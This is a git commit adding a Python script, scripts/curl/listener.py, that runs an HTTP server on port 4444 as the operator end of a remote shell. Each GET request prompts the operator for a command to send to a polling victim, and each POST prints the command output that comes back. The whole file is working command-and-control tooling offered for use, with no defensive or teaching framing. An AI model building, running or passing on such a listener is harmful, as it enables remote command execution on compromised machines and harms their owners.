098008fd90dd445108fcda5c3de6d1a8690ab60a
matusbucher <bucher.matus@gmail.com>
2025-04-15 10:56:45 +0200

    Add curl

---
+++ scripts/curl/listener.py
@@ -0,0 +1,22 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+port = 4444
+
+class ShellHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        current_command = input("[+] Enter command to execute: ")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(current_command.encode())
+
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(length)
+        print(f"[+] Command output:\n{post_data.decode()}")
+        self.send_response(200)
+        self.end_headers()
+
+if __name__ == "__main__":
+    server = HTTPServer(("0.0.0.0", port), ShellHandler)
+    print(f"[*] Listening on port {port}...")
+    server.serve_forever()
